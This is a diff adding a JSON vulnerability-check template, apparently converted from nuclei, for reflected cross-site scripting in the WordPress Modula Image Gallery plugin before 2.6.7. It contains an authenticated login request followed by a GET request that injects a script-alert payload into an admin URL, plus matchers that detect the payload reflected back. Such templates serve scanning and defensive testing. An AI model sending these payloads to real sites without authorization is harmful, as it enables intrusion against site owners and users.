@@ -1,0 +1,172 @@
+{
+  "id": "modula-image-gallery-xss",
+  "name": "WordPress Modula Image Gallery \u003c2.6.7 - Cross-Site Scripting",
+  "author": "Akincibor",
+  "severity": "MEDIUM",
+  "description": "WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.",
+  "references": [
+    "https://wpscan.com/vulnerability/ee248078-89ee-4cc0-b0fe-e932cd00db3e",
+    "https://wordpress.org/plugins/modula-best-grid-gallery"
+  ],
+  "tags": [
+    "authenticated",
+    "wpscan",
+    "wp-plugin",
+    "xss",
+    "wp",
+    "wordpress"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-80",
+  "cvssScore": "5.4",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie\u003dWP%20Cookie%20check\n\nlog\u003d{{username}}\u0026pwd\u003d{{password}}\u0026wp-submit\u003dLog+In\u0026testcookie\u003d1\n",
+        "GET /wp-admin/edit.php?post_type\u003dmodula-gallery\u0026page\u003dmodula-addons\u0026a\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u0026a\\\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u0026extensions\u003d"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "modula-image-gallery-xss",
+    "info": {
+      "name": "WordPress Modula Image Gallery \u003c2.6.7 - Cross-Site Scripting",
+      "author": "Akincibor",
+      "severity": "medium",
+      "description": "WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.",
+      "reference": [
+        "https://wpscan.com/vulnerability/ee248078-89ee-4cc0-b0fe-e932cd00db3e",
+        "https://wordpress.org/plugins/modula-best-grid-gallery"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+        "cvss_score": "5.4",
+        "cwe_id": "CWE-80"
+      },
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "authenticated,wpscan,wp-plugin,xss,wp,wordpress"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie\u003dWP%20Cookie%20check\n\nlog\u003d{{username}}\u0026pwd\u003d{{password}}\u0026wp-submit\u003dLog+In\u0026testcookie\u003d1\n",
+          "GET /wp-admin/edit.php?post_type\u003dmodula-gallery\u0026page\u003dmodula-addons\u0026a\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u0026a\\\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u0026extensions\u003d"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
